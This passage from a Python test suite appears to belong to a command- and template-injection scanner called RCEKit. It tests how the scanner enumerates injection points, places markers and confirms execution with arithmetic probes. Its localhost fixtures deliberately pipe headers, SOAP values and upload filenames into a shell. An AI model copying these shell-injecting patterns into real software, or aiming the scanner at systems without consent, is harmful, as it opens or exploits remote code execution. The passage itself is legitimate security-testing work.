        # document all the same.
        names = self._names({"query": "{ me { id } }", "variables": {"a": 1, "b": 2}})
        self.assertEqual(names[-1], "query")

    def test_a_leading_comment_does_not_hide_the_document(self):
        names = self._names({"query": "# saved by the IDE\nquery S { me { id } }",
                             "variables": {"a": 1}})
        self.assertEqual(names[-1], "query")

    def test_a_plain_json_body_with_a_query_field_is_not_reordered(self):
        # `{"query": ...}` alone is as likely to be a search API, and there the
        # query field is the one worth testing first.
        self.assertEqual(self._names({"query": "shoes", "page": 1}), ["query", "page"])

    def test_a_graphql_body_without_variables_keeps_its_query_point(self):
        self.assertIn("query", self._names({"query": "{ me { id } }"}))


class InjectionPointPlacementTestCase(unittest.TestCase):
    """Each kind is rewritten in its own serialization, so the value is escaped
    by the layer that owns it rather than blanket-encoded for all of them."""

    def setUp(self):
        self.req = parse_raw_request(RAW_CAPTURE)

    def _place(self, kind, name):
        if kind == "json":
            # JSON points are addressed by tokens, so take the real enumerated
            # point rather than hand-building one — that is the pairing that
            # actually runs.
            point = next((p for p in rcekit.enumerate_injection_points(self.req)
                          if p.kind == "json" and p.name == name),
                         rcekit.InjectionPoint("json", name, name, ()))
        else:
            point = rcekit.InjectionPoint(kind, name, f"{kind} '{name}'")
        return rcekit.place_injection_point(
            self.req["target"], self.req["headers"], self.req["body"], point, "FUZZ")

    def test_query_value_is_replaced_in_place(self):
        target, _, _ = self._place("query", "view")
        self.assertEqual(target, "/cgi-bin/status?view=FUZZ&lang=en")

    def test_a_nested_json_leaf_is_replaced_and_the_body_stays_valid_json(self):
        _, _, body = self._place("json", "user.profile.name")
        self.assertEqual(json.loads(body)["user"]["profile"]["name"], "FUZZ")
        self.assertEqual(json.loads(body)["tags"], ["a", 2])

    def test_a_json_array_element_is_replaced_by_index(self):
        _, _, body = self._place("json", "tags[1]")
        self.assertEqual(json.loads(body)["tags"], ["a", "FUZZ"])

    def test_one_cookie_crumb_is_replaced_and_the_others_survive(self):
        _, headers, _ = self._place("cookie", "theme")
        cookie = next(v for n, v in headers if n.lower() == "cookie")
        self.assertIn("sid=abc123", cookie)
        self.assertIn("theme=FUZZ", cookie)

    def test_a_header_value_is_replaced_whole(self):
        _, headers, _ = self._place("header", "User-Agent")
        self.assertEqual(dict((n, v) for n, v in headers)["User-Agent"], "FUZZ")

    def test_a_path_segment_is_replaced_and_the_query_survives(self):
        target, _, _ = self._place("path", "1")
        self.assertEqual(target, "/FUZZ/status?view=summary&lang=en")

    def test_a_point_that_is_no_longer_there_returns_none(self):
        self.assertIsNone(self._place("query", "nosuchparam"))
        self.assertIsNone(self._place("json", "user.missing"))
        self.assertIsNone(self._place("header", "X-Absent"))

    def test_build_request_inputs_accepts_a_point(self):
        point = rcekit.InjectionPoint("header", "User-Agent", "header 'User-Agent'")
        url, method, data, headers, injection = build_request_inputs(
            RAW_CAPTURE, scheme="https", point=point)
        self.assertEqual(url, "https://target.example/cgi-bin/status?view=summary&lang=en")
        self.assertEqual(method, "POST")
        self.assertEqual(injection, "header 'User-Agent'")
        self.assertIn("User-Agent: FUZZ", headers)
        # Host and Content-Length are rebuilt by the delivery layer.
        self.assertFalse([h for h in headers if h.lower().startswith(("host:", "content-length:"))])

    def test_a_point_wins_over_a_leftover_inline_marker(self):
        # Otherwise enumeration would test the same place for every candidate.
        raw = RAW_CAPTURE.replace("lang=en", "lang=FUZZ")
        point = rcekit.InjectionPoint("query", "view", "query param 'view'")
        url, _, _, _, injection = build_request_inputs(raw, scheme="https", point=point)
        self.assertIn("view=FUZZ", url)
        self.assertEqual(injection, "query param 'view'")


class DuplicateMarkerTestCase(unittest.TestCase):
    """A capture that already carries `FUZZ` had the payload put in two places.

    The delivery layer substitutes at *every* occurrence of the marker, which is
    right for a marker the operator wrote -- two `FUZZ` in a request mean both --
    and wrong for one RCEKit inserted. Enumeration places its own marker at a
    chosen point and a point wins over an inline marker by design, so a capture
    containing the literal `FUZZ` ended up with two: the payload landed in a
    field nobody selected, and a confirmation could not be attributed to the
    point under test.

    `-p NAME` never reached this, and that is the near neighbour worth pinning:
    a pre-existing marker sends it down the *inline* path instead, where every
    occurrence is the operator's and replacing all of them is the whole point."""

    def _built(self, ctype, body, kind, name, query=""):
        raw = (f"POST /s{query} HTTP/1.1\r\nHost: t.example\r\n"
               f"Content-Type: {ctype}\r\n\r\n{body}")
        mark = rcekit.unique_marker() if "FUZZ" in raw else "FUZZ"
        point = next(p for p in rcekit.enumerate_injection_points(parse_raw_request(raw))
                     if p.kind == kind and p.name == name)
        url, _m, data, hdrs, _l = rcekit.build_request_inputs(raw, point=point, mark=mark)
        return RCEKit(), url, data, hdrs, mark, point

    def test_the_marker_is_recognisable_and_cannot_be_in_a_capture(self):
        first, second = rcekit.unique_marker(), rcekit.unique_marker()
        self.assertTrue(first.startswith("FUZZ"), "a marked request should still read as marked")
        self.assertNotEqual(first, second, "a fresh marker per call")
        self.assertTrue(first[4:].isalnum(), "must survive every carrier's escaping")
        self.assertGreater(len(first), len("FUZZ"))

    def test_the_payload_lands_once_in_each_body_kind(self):
        for ctype, body, kind, name, untouched in [
            ("text/xml", "<root><doc><![CDATA[FUZZ]]></doc><cmd>a</cmd></root>",
             "xml", "root/cmd", "<![CDATA[FUZZ]]>"),
            ("application/json", '{"note": "FUZZ", "cmd": "a"}',
             "json", "cmd", '"note": "FUZZ"'),
            ("application/x-www-form-urlencoded", "note=FUZZ&cmd=a",
             "form", "cmd", "note=FUZZ"),
        ]:
            kit, url, data, hdrs, mark, point = self._built(ctype, body, kind, name)
            location = (f"xml_{point.span}" if point.kind == "xml"
                        else kit._detect_body_location(data, hdrs, mark))
            _t, rendered, _h = kit._build_verify_request(
                "PAYLOAD", url, data, hdrs, "query_value", location, mark)
            sent = rendered.decode()
            self.assertEqual(sent.count("PAYLOAD"), 1, f"{kind}: {sent}")
            self.assertIn(untouched, sent, f"{kind}: the captured value must go as captured")

    def test_the_payload_lands_once_in_a_query_string(self):
        kit, url, data, hdrs, mark, _p = self._built(
            "text/plain", "x", "query", "cmd", query="?note=FUZZ&cmd=a")
        target, _b, _h = kit._build_verify_request(
            "PAYLOAD", url, data, hdrs, "raw", "raw", mark)
        self.assertEqual(target.count("PAYLOAD"), 1, target)
        self.assertIn("note=FUZZ", target)

    def test_a_capture_without_the_marker_still_uses_fuzz(self):
        # The near neighbour of every case above, and the reason the swap is
        # conditional: FUZZ is what the exports, the docs and the inline path
        # all name, so it is left alone wherever it cannot collide.
        raw = ("POST /s HTTP/1.1\r\nHost: t.example\r\n"
               "Content-Type: application/json\r\n\r\n" '{"note": "x", "cmd": "a"}')
        self.assertNotIn("FUZZ", raw)
        point = next(p for p in rcekit.enumerate_injection_points(parse_raw_request(raw))
                     if p.kind == "json" and p.name == "cmd")
        _u, _m, data, _h, _l = rcekit.build_request_inputs(raw, point=point, mark="FUZZ")
        self.assertEqual(data, '{"note": "x", "cmd": "FUZZ"}')

    def test_naming_a_param_in_a_marked_capture_still_takes_the_inline_path(self):
        # Unchanged on purpose. `-p` cannot produce the collision because a
        # pre-existing marker wins before the parameter is ever placed, so
        # giving it a marker of its own would change which place is tested.
        raw = ("POST /s HTTP/1.1\r\nHost: t.example\r\n"
               "Content-Type: application/json\r\n\r\n" '{"note": "FUZZ", "cmd": "a"}')
        _u, _m, data, _h, injection = rcekit.build_request_inputs(raw, param="cmd")
        self.assertEqual(injection, "inline marker")
        self.assertEqual(data, '{"note": "FUZZ", "cmd": "a"}')

    def test_an_operator_who_wrote_two_markers_still_gets_both(self):
        # The behaviour the unbounded substitution exists for.
        kit = RCEKit()
        _t, rendered, _h = kit._build_verify_request(
            "P", "http://t.example/s", '{"a": "FUZZ", "b": "FUZZ"}',
            ["Content-Type: application/json"], "query_value", "json_string")
        self.assertEqual(rendered.decode().count("P"), 2)

    def test_threading_the_marker_moved_no_existing_positional_slot(self):
        """The marker is appended to every signature it was threaded through.

        Inserting it mid-signature moves every later parameter along by one, and
        a caller passing one of those positionally then binds the wrong value:
        `run_detection`'s `config` landed in `mark`, and the first delivery
        raised `TypeError` from `str.replace`. Pinned per signature rather than
        as one rule, because the fix for `run_detection` puts `mark` somewhere
        its meaning does not suggest -- so the next person to tidy it needs this
        to fail."""
        import inspect
        for name in ("run_detection", "run_verification", "_fire", "_fire_channels",
                     "_escalate", "_detect_body_location"):
            params = list(inspect.signature(getattr(RCEKit, name)).parameters)
            self.assertEqual(params[-1], "mark",
                             f"{name}: mark must be last, or it shifts "
                             f"{params[params.index('mark') + 1:]}")

    def test_a_caller_passing_config_positionally_still_gets_config(self):
        # The break this ordering exists to prevent, stated as the call that
        # broke: `config` was the twelfth positional argument after `self`.
        import inspect
        config = {"probe_depth": "quick"}
        bound = inspect.signature(RCEKit.run_detection).bind(
            RCEKit(), iter([]), "http://t.example/x?q=FUZZ", ["reflected"],
            "GET", None, None, 0.0, 1.0, 1, "query_value", None, config)
        self.assertEqual(bound.arguments.get("config"), config)
        self.assertNotIn("mark", bound.arguments,
                         "mark must fall back to its default, not eat config")


class EnumerationEndToEndTestCase(unittest.TestCase):
    """The acceptance case: a sink reachable only through a header, found with
    `-p all` and no manual header selection."""

    def _run(self, *args):
        return subprocess.run(
            [sys.executable, str(SCRIPT), *args],
            cwd=str(REPO_ROOT), capture_output=True, text=True, timeout=300)

    def test_a_header_only_sink_is_found_without_naming_the_header(self):
        import os
        import tempfile

        def route(method, path, params, headers, body):
            pipe = sh_popen("echo CGI " + headers.get("User-Agent", "") + " 2>&1")
            out = pipe.read()
            pipe.close()
            return 200, out

        with local_target(route) as base, tempfile.TemporaryDirectory() as tmp:
            host = base.split("//", 1)[1]
            capture = Path(tmp) / "request.txt"
            capture.write_text(
                "POST /cgi-bin/status?view=summary HTTP/1.1\n"
                f"Host: {host}\n"
                "User-Agent: Mozilla/5.0\n"
                "Cookie: sid=abc123\n"
                "Content-Type: application/json\n"
                "\n"
                '{"user": {"name": "ali"}}\n')
            result = self._run("--acknowledge-consent", "-r", str(capture), "-p", "all",
                               "--methods", "reflected", "--environments", "unix",
                               "--max-payloads", "12")

        self.assertEqual(result.returncode, 0, result.stdout[-2000:])
        # It enumerated rather than needing the sink named...
        self.assertIn("query param 'view'", result.stdout)
        self.assertIn("JSON field 'user.name'", result.stdout)
        self.assertIn("cookie 'sid'", result.stdout)
        # ...it said what the run would cost before sending it...
        self.assertRegex(result.stdout, r"\[detect\] cost: \d+ points x ~\d+ probes")
        # ...and the finding names the point that worked.
        self.assertIn("EXECUTED (", result.stdout)
        self.assertIn("at header 'User-Agent'", result.stdout)

    def _soap_run(self, path, body=None):
        """Point the whole CLI at a SOAP endpoint that shells its `<name>`.

        The target parses the envelope, so it undoes the XML escaping the
        delivery layer applied -- which is the half a unit test of the encoder
        cannot show. `&amp;` has to arrive at the sink as `&`, or a payload
        carrying a separator reaches a shell that never sees it."""
        import tempfile

        name_re = re.compile(r"<name>(.*?)</name>", re.S)

        def route(method, path_, params, headers, body_):
            match = name_re.search(body_ or "")
            value = match.group(1) if match else ""
            for entity, char in (("&lt;", "<"), ("&gt;", ">"), ("&quot;", '"'),
                                 ("&apos;", "'"), ("&amp;", "&")):
                value = value.replace(entity, char)
            if path_.startswith("/vuln"):
                pipe = sh_popen("echo " + value + " 2>&1")
                out = pipe.read()
                pipe.close()
            else:  # /reflect: echo the value, never execute it
                out = value
            return 200, f"<?xml version=\"1.0\"?><Envelope><Body><r>{out}</r></Body></Envelope>"

        envelope = body if body is not None else (
            '<?xml version="1.0"?><Envelope><Body>'
            '<getUser id="42"><name>alice</name></getUser></Body></Envelope>')
        with local_target(route) as base, tempfile.TemporaryDirectory() as tmp:
            host = base.split("//", 1)[1]
            capture = Path(tmp) / "request.txt"
            capture.write_text(f"POST {path} HTTP/1.1\nHost: {host}\n"
                               "Content-Type: text/xml; charset=utf-8\n\n" + envelope)
            return self._run("--acknowledge-consent", "-r", str(capture),
                             "--auto-params", "xml", "--methods", "reflected",
                             "--request-scheme", "http", "--environments", "unix",
                             "--contexts", "raw", "--probe-depth", "quick")

    def test_a_soap_element_sink_is_found_and_confirmed_end_to_end(self):
        result = self._soap_run("/vuln")
        self.assertEqual(result.returncode, 0, result.stdout[-2000:])
        # It enumerated the envelope rather than reading it as a form...
        self.assertIn("XML element 'Envelope/Body/getUser/name'", result.stdout)
        self.assertIn("XML attribute 'Envelope/Body/getUser/@id'", result.stdout)
        # ...so no form point claimed the body, which is the regression: the
        # envelope used to yield exactly one, named after its prolog.
        self.assertNotIn("body param", result.stdout)
        # ...and the finding names the XML point that worked.
        self.assertIn("EXECUTED (", result.stdout)
        self.assertIn("at XML element 'Envelope/Body/getUser/name'", result.stdout)

    def test_a_soap_endpoint_that_only_echoes_is_never_confirmed(self):
        # The other half of the gate. The same envelope, the same probes, a
        # target that returns the value instead of running it.
        result = self._soap_run("/reflect")
        self.assertEqual(result.returncode, 0, result.stdout[-2000:])
        self.assertIn("XML element 'Envelope/Body/getUser/name'", result.stdout)
        self.assertNotIn("EXECUTED (", result.stdout)
        self.assertNotIn("<-- EXECUTED", result.stdout)

    def test_a_signed_envelope_says_why_it_enumerated_nothing(self):
        # Finding nothing in a signed body is a statement about the capture,
        # not about the target, so the run must not let it pass for a clean one.
        signed = ('<Envelope xmlns:ds="http://www.w3.org/2000/09/xmldsig#">'
                  "<ds:Signature><ds:SignatureValue>AA==</ds:SignatureValue></ds:Signature>"
                  '<Body><getUser id="42"><name>alice</name></getUser></Body></Envelope>')
        result = self._soap_run("/vuln", body=signed)
        self.assertIn("carries an XML signature", result.stdout)
        self.assertIn("nothing was tested", result.stdout)
        self.assertEqual(result.returncode, 1)

    def test_a_captured_marker_is_never_overwritten_on_the_wire(self):
        # The duplicate-marker regression, measured where it matters: in the
        # bodies the target actually received. A unit test can show the one
        # rendered request; only this shows that no probe in a whole run put
        # the payload in a field nobody selected.
        import json as _json
        import tempfile

        received = []

        def route(method, path, params, headers, body):
            received.append(body or "")
            return 200, "ok"

        with local_target(route) as base, tempfile.TemporaryDirectory() as tmp:
            host = base.split("//", 1)[1]
            capture = Path(tmp) / "request.txt"
            capture.write_text("POST /api HTTP/1.1\n"
                               f"Host: {host}\n"
                               "Content-Type: application/json\n"
                               "\n"
                               '{"note": "FUZZ", "cmd": "alice"}')
            result = self._run("--acknowledge-consent", "-r", str(capture),
                               "--auto-params", "json", "--methods", "reflected",
                               "--request-scheme", "http", "--environments", "unix",
                               "--contexts", "raw", "--probe-depth", "quick",
                               "--max-payloads", "6")

        self.assertEqual(result.returncode, 0, result.stdout[-2000:])
        self.assertTrue(received, "the target received nothing")
        # Both fields are enumerated, so `note` carrying the payload is correct
        # in the run that tests `note`. What must never happen is one request
        # carrying it in *both*, which is what the shared marker produced and
        # what makes a confirmation unattributable.
        touched_cmd = 0
        for raw_body in received:
            try:
                parsed = _json.loads(raw_body)
            except ValueError:
                continue
            changed = [field for field, captured in (("note", "FUZZ"), ("cmd", "alice"))
                       if parsed.get(field) != captured]
            self.assertLessEqual(len(changed), 1,
                                 f"the payload landed in {changed}: {raw_body}")
            touched_cmd += "cmd" in changed
        self.assertTrue(touched_cmd, "the run never tested the second point, so this "
                                     "would have passed without exercising the fix")
        # Checked last, so a failure names the behaviour rather than the wording.
        self.assertIn("already contains the literal FUZZ", result.stdout,
                      "the run should say it is using a marker of its own")

    def _upload_run(self, path):
        """Point the whole CLI at an endpoint that shells an upload's filename.

        The realistic shape: a converter, a thumbnailer or an archiver invoked
        with the name the client supplied. `/vuln` runs it; `/reflect` returns
        it. Nothing here reaches the network -- `local_target` binds 127.0.0.1
        on an ephemeral port."""
        import tempfile

        def route(method, path_, params, headers, body_):
            filename = rcekit._multipart_filename(body_ or "") or ""
            # The far side reads the quoted-string form, so it undoes the
            # escaping before the name reaches the command -- which is the half
            # a unit test of the encoder cannot show.
            filename = filename.replace('\\"', '"').replace("\\\\", "\\")
            if path_.startswith("/vuln"):
                pipe = sh_popen("echo converting " + filename + " 2>&1")
                out = pipe.read()
                pipe.close()
            else:  # /reflect: name it back, never run it
                out = "converting " + filename
            return 200, out

        with local_target(route) as base, tempfile.TemporaryDirectory() as tmp:
            host = base.split("//", 1)[1]
            capture = Path(tmp) / "upload.txt"
            capture.write_text(
                f"POST {path} HTTP/1.1\n"
                f"Host: {host}\n"
                "Content-Type: multipart/form-data; boundary=----B1\n"
                "\n"
                "------B1\n"
                'Content-Disposition: form-data; name="avatar"; filename="a.txt"\n'
                "Content-Type: text/plain\n"
                "\n"
                "file content\n"
                "------B1--\n")
            return self._run("--acknowledge-consent", "-r", str(capture),
                             "--auto-params", "filename", "--methods", "reflected",
                             "--request-scheme", "http", "--environments", "unix",
                             "--contexts", "raw", "--probe-depth", "quick")

    def test_a_filename_sink_is_found_and_confirmed_end_to_end(self):
        result = self._upload_run("/vuln")
        self.assertEqual(result.returncode, 0, result.stdout[-2000:])
        self.assertIn("multipart filename of 'avatar'", result.stdout)
        self.assertIn("EXECUTED (", result.stdout)
        self.assertIn("at multipart filename of 'avatar'", result.stdout)

    def test_a_filename_endpoint_that_only_echoes_is_never_confirmed(self):
        # The other half of the gate: the same capture, the same probes, a
        # target that names the file back instead of running it.
        result = self._upload_run("/reflect")
        self.assertEqual(result.returncode, 0, result.stdout[-2000:])
        self.assertIn("multipart filename of 'avatar'", result.stdout)
        self.assertNotIn("EXECUTED (", result.stdout)
        self.assertNotIn("<-- EXECUTED", result.stdout)

    def test_enumeration_without_methods_is_refused(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            capture = Path(tmp) / "request.txt"
            capture.write_text("GET /?a=1 HTTP/1.1\nHost: t.example\n\n")
            result = self._run("--acknowledge-consent", "-r", str(capture), "-p", "all")
        self.assertEqual(result.returncode, 1)
        self.assertIn("needs --methods", result.stdout)

    def test_an_unknown_auto_params_kind_is_refused(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            capture = Path(tmp) / "request.txt"
            capture.write_text("GET /?a=1 HTTP/1.1\nHost: t.example\n\n")
            result = self._run("--acknowledge-consent", "-r", str(capture),
                               "--auto-params", "query,bogus", "--methods", "reflected")
        self.assertEqual(result.returncode, 1)
        self.assertIn("bogus", result.stdout)


class JsonPathTestCase(unittest.TestCase):
    def test_leaf_tokens_skip_containers_booleans_and_nulls(self):
        obj = {"a": {"b": 1}, "ok": True, "none": None, "list": [{"c": "x"}]}
        self.assertEqual(rcekit._json_leaf_tokens(obj), [("a", "b"), ("list", 0, "c")])

    def test_rendering_is_readable_and_quotes_ambiguous_keys(self):
        self.assertEqual(rcekit._render_json_path(("user", "profile", "name")),
                         "user.profile.name")
        self.assertEqual(rcekit._render_json_path(("items", 0, "v")), "items[0].v")
        # A key containing the separator must not render as the nested path of
        # the same spelling.
        self.assertEqual(rcekit._render_json_path(("user.name",)), '["user.name"]')
        self.assertNotEqual(rcekit._render_json_path(("user.name",)),
                            rcekit._render_json_path(("user", "name")))

    def test_setting_a_missing_path_fails_rather_than_creating_it(self):
        obj = {"a": {"b": 1}}
        self.assertFalse(rcekit._set_json_tokens(obj, ("a", "zzz", "q"), "X"))
        self.assertFalse(rcekit._set_json_tokens(obj, ("list", 3), "X"))
        self.assertFalse(rcekit._set_json_tokens(obj, (), "X"))
        self.assertTrue(rcekit._set_json_tokens(obj, ("a", "b"), "X"))
        self.assertEqual(obj["a"]["b"], "X")

    def test_a_deeply_nested_body_is_bounded_not_fatal(self):
        deep = json.loads("[" * 400 + '"x"' + "]" * 400)
        self.assertEqual(rcekit._json_leaf_tokens(deep, max_depth=8), [])


class JsonKeyBoundaryTestCase(unittest.TestCase):
    """A JSON key may itself contain the characters a dotted path uses.

    Addressing by a joined string could not tell `{"user.name": ...}` from
    `{"user": {"name": ...}}`: both rendered as `user.name`, so the literal key
    was never probed and both candidates mutated the nested field — a false
    negative and a misattributed finding at once."""

    RAW = ('POST /a HTTP/1.1\r\nHost: t.example\r\nContent-Type: application/json\r\n\r\n'
           '{"user.name": "sinkA", "user": {"name": "sinkB"}, "a[0]": "sinkC"}')

    def setUp(self):
        self.req = parse_raw_request(self.RAW)
        self.points = [p for p in rcekit.enumerate_injection_points(self.req)
                       if p.kind == "json"]

    def _place(self, point):
        placed = rcekit.place_injection_point(
            self.req["target"], self.req["headers"], self.req["body"], point, "FUZZ")
        return json.loads(placed[2]) if placed else None

    def test_ambiguous_keys_get_distinct_labels(self):
        names = [p.name for p in self.points]
        self.assertEqual(len(names), len(set(names)), names)
        self.assertIn('["user.name"]', names)
        self.assertIn("user.name", names)
        self.assertIn('["a[0]"]', names)

    def test_each_candidate_reaches_its_own_leaf(self):
        placed = {p.name: self._place(p) for p in self.points}
        self.assertEqual(placed['["user.name"]']["user.name"], "FUZZ")
        self.assertEqual(placed['["user.name"]']["user"]["name"], "sinkB",
                         "the nested field must be untouched")
        self.assertEqual(placed["user.name"]["user"]["name"], "FUZZ")
        self.assertEqual(placed["user.name"]["user.name"], "sinkA",
                         "the literal key must be untouched")
        self.assertEqual(placed['["a[0]"]']["a[0]"], "FUZZ")

    def test_no_candidate_is_silently_skipped(self):
        for point in self.points:
            self.assertIsNotNone(self._place(point), point.name)

    def test_a_deeply_nested_capture_does_not_kill_enumeration(self):
        # json.loads recurses in C, so a deep body would end `-p all` with a
        # traceback rather than an enumeration.
        deep = "[" * 3000 + '"x"' + "]" * 3000
        raw = ('POST /a?q=1 HTTP/1.1\r\nHost: t.example\r\n'
               'Content-Type: application/json\r\n\r\n' + deep)
        points = rcekit.enumerate_injection_points(parse_raw_request(raw))
        self.assertFalse([p for p in points if p.kind == "json"],
                         "an unparseable body yields no JSON candidates")
        self.assertTrue([p for p in points if p.kind == "query"],
                        "and the rest of the request still enumerates")


class DetectionCostEstimateTestCase(unittest.TestCase):
    """The ladder, the carriers and the candidate count each multiply request
    volume, so the number is printed before the traffic rather than inferred
    from it afterwards."""

    def setUp(self):
        self.gen = RCEKit()
        self.records = [make_record(environment="unix", context="raw")]

    def test_the_estimate_matches_what_a_run_actually_sends(self):
        estimate = self.gen.estimate_detection_probes(self.records, ["reflected"])
        with local_target(lambda *a: (200, "static")) as base:
            results = self.gen.run_detection(
                self.records, url=f"{base}/?x=FUZZ", methods=["reflected"])
        self.assertEqual(estimate, len(results))

    def test_the_estimate_sends_nothing(self):
        # It must be safe to call before the consent-gated traffic starts.
        estimate = self.gen.estimate_detection_probes(
            self.records, ["reflected", "eval"], {"sink_shapes": ("sep",)})
        self.assertGreater(estimate, 0)

    def test_narrowing_the_ladder_lowers_the_estimate(self):
        wide = self.gen.estimate_detection_probes(self.records, ["reflected"])
        narrow = self.gen.estimate_detection_probes(
            self.records, ["reflected"], {"sink_shapes": ("sep",)})
        self.assertLess(narrow, wide)

    def test_an_unknown_method_is_ignored_rather_than_fatal(self):
        self.assertEqual(self.gen.estimate_detection_probes(self.records, ["nosuchmethod"]), 0)

    def test_the_estimate_honours_max_payloads(self):
        # An estimate that ignores the cap is wrong exactly when the operator
        # reached for the budget guard.
        uncapped = self.gen.estimate_detection_probes(self.records, ["reflected"])
        self.assertGreater(uncapped, 12)
        self.assertEqual(
            self.gen.estimate_detection_probes(self.records, ["reflected"], max_payloads=12), 12)

    def test_the_capped_estimate_still_matches_a_capped_run(self):
        with local_target(lambda *a: (200, "static")) as base:
            results = self.gen.run_detection(
                self.records, url=f"{base}/?x=FUZZ", methods=["reflected"], max_payloads=12)
        self.assertEqual(
            self.gen.estimate_detection_probes(self.records, ["reflected"], max_payloads=12),
            len(results))


class EvalCarrierTestCase(unittest.TestCase):
    """Engine carriers for the `eval` probe.

    A carrier exists for exactly one reason: the engine is vulnerable and the
    bare probe cannot see it, so a target that really does evaluate the
    template reads as `negative`. Five engines were measured to be in that
    position, two ways. Freemarker, Velocity and Thymeleaf evaluate the
    expression and do not put the bare product in the response; Liquid and
    Django have no arithmetic operator at all and multiply through a filter and
    a tag instead. Every other engine tested — including OGNL with member
    access denied outright, SpEL's restricted context, and Jinja2's
    SandboxedEnvironment — returns the bare product from the bare probe, so a
    sandbox is not what carriers are for."""

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="java", context="raw")

    def _probes(self, config=None):
        import random as _random
        return EvalExpr(self.gen, config or {}).build_probes(self.rec, _random.Random(42))

    def test_the_corpus_declares_the_carriers(self):
        # Invariant: new payload material is declarative, so coverage can be
        # extended without touching Python.
        self.assertTrue(self.gen.eval_carriers)
        for name, carrier in self.gen.eval_carriers.items():
            self.assertIn("template", carrier, name)
            # The joined expression, or *both* operands. An engine that
            # multiplies through a filter or a tag needs them apart and cannot
            # use the joined one; one operand on its own is no better than none,
            # because the target is never handed the other and nothing it can
            # compute is the product RCEKit is looking for.
            left, right = EvalExpr.CARRIER_OPERAND_TOKENS
            template = carrier["template"]
            self.assertTrue(
                EvalExpr.CARRIER_TOKEN in template
                or (left in template and right in template),
                f"{name} is not parameterised by both operands, so it cannot confirm")
            self.assertTrue(carrier.get("notes"), f"{name} must say why it exists")
            self.assertTrue(carrier.get("verified"),
                            f"{name} must record what it was measured against")

    def test_bare_forms_come_first(self):
        # Fewest requests and the cleanest evidence line, and they already cover
        # every engine that returns a bare product.
        probes = self._probes()
        carriers = [i for i, p in enumerate(probes) if p.carrier]
        bare = [i for i, p in enumerate(probes) if not p.carrier]
        self.assertTrue(bare and carriers)
        self.assertLess(max(bare), min(carriers))

    def test_carriers_do_not_change_the_oracle(self):
        # The carrier varies the wrapper, never the proof: the expected value is
        # still a product of random operands that the payload never spells out.
        for probe in self._probes():
            self.assertNotIn(probe.expected, probe.payload)
        # And every payload is parameterised by *this run's* operands. Asserting
        # `forbidden in payload` used to stand in for that, but a filter carrier
        # writes `{{ a | times: b }}` and never spells the joined `a*b` out at
        # all -- and setting `forbidden` to the rendered body to make it fit
        # would have made the assertion equal `payload in payload`, true for
        # every carrier however broken.
        expr = next(p.forbidden for p in self._probes() if not p.carrier)
        left, right = expr.split("*")
        for probe in self._probes():
            self.assertIn(left, probe.payload, probe.carrier or "bare")
            self.assertIn(right, probe.payload, probe.carrier or "bare")

    def test_every_probe_shares_one_expected_value(self):
        self.assertEqual(len({p.expected for p in self._probes()}), 1)

    def test_the_shipped_carriers_render_exactly_what_was_verified(self):
        # Pinned deliberately. Each of these strings was run through the real
        # engine and confirmed to yield the bare product where the bare ${a*b}
        # does not; changing one silently would undo that without any test
        # noticing.
        rendered = {p.carrier: p.payload for p in self._probes() if p.carrier}
        # Taken from a *bare* probe: a carrier's `forbidden` is the joined
        # arithmetic, but reading it from a carrier made this test compare the
        # freemarker payload against itself once the carriers stopped all
        # containing it.
        expr = next(p.forbidden for p in self._probes() if not p.carrier)
        a, b = expr.split("*")
        self.assertEqual(rendered["freemarker"], f"${{({expr})?c}}")
        self.assertEqual(rendered["velocity"], f"#set($rk={expr})$rk")
        self.assertEqual(rendered["thymeleaf"], f"[[${{{expr}}}]]")
        self.assertEqual(rendered["liquid"], f"{{{{ {a} | times: {b} }}}}")
        self.assertEqual(rendered["django"], f"{{% widthratio {a} 1 {b} %}}")

    def test_eval_engines_narrows_the_carriers(self):
        probes = self._probes({"eval_engines": ("velocity",)})
        self.assertEqual({p.carrier for p in probes if p.carrier}, {"velocity"})
        self.assertTrue([p for p in probes if not p.carrier], "bare forms always stay")

    def test_an_unknown_engine_name_selects_no_carrier_but_keeps_the_bare_probes(self):
        probes = self._probes({"eval_engines": ("nosuchengine",)})
        self.assertEqual([p for p in probes if p.carrier], [])
        self.assertEqual(len(probes), len(EvalExpr._FORMS))

    def test_the_evidence_names_the_carrier(self):
        # So a finding says which engine quirk it had to work around, rather
        # than leaving the tester to rediscover it.
        probe = next(p for p in self._probes() if p.carrier == "freemarker")
        verdict = EvalExpr(self.gen).confirm(
            Observation(200, f"out {probe.expected} end", control_body="idle"), probe)
        self.assertEqual(verdict.status, "executed")
        self.assertIn("freemarker carrier", verdict.evidence)

    def test_a_bare_confirmation_evidence_is_unchanged(self):
        probe = next(p for p in self._probes() if not p.carrier)
        verdict = EvalExpr(self.gen).confirm(
            Observation(200, f"out {probe.expected} end", control_body="idle"), probe)
        self.assertEqual(verdict.status, "executed")
        self.assertNotIn("carrier", verdict.evidence)

    def test_a_digit_grouping_engine_confirms_only_through_its_carrier(self):
        # Freemarker's actual behaviour, without needing Freemarker: it renders
        # a bare ${a*b} with the locale's grouping separators, so the product
        # RCEKit searches for is absent from a target that evaluated it
        # perfectly. Measured: '${a*b}' -> '2,070,761,401'.
        def route(method, path, params, headers, body):
            value = params.get("t", "")
            if value.startswith("${(") and value.endswith(")?c}"):
                return 200, str(eval(value[3:-4]))          # ?c: bare digits
            if value.startswith("${") and value.endswith("}"):
                return 200, "{:,}".format(eval(value[2:-1]))  # grouped digits
            return 200, value

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/?t=FUZZ", methods=["eval"])
        confirmed = [r for r in results if r["verdict"] == "executed"]
        self.assertTrue(confirmed, "the carrier must reach a digit-grouping engine")
        self.assertTrue(all("freemarker carrier" in r["detail"] for r in confirmed))

    def test_a_clean_target_stays_negative_with_carriers_enabled(self):
        with local_target(lambda *a: (200, "<html>static 3979016000</html>")) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/?t=FUZZ", methods=["eval"])
        self.assertFalse([r for r in results if r["verdict"] == "executed"])


class SinkShapeLadderTestCase(unittest.TestCase):
    """The sink-shape ladder: the shapes an injected value can land in.

    The rung that carries the weight is `subshell`. Its value is *not* where it
    first looks: `reflected`'s arithmetic core `$((a+b))` is expanded by the
    shell inside double quotes anyway, so that method already confirmed on a
    quoted sink without any new rung. The methods whose core has to actually
    *run* something — file (a redirect), time (a sleep), oob (a fetch) — are
    completely inert inside those quotes, and a command substitution is the only
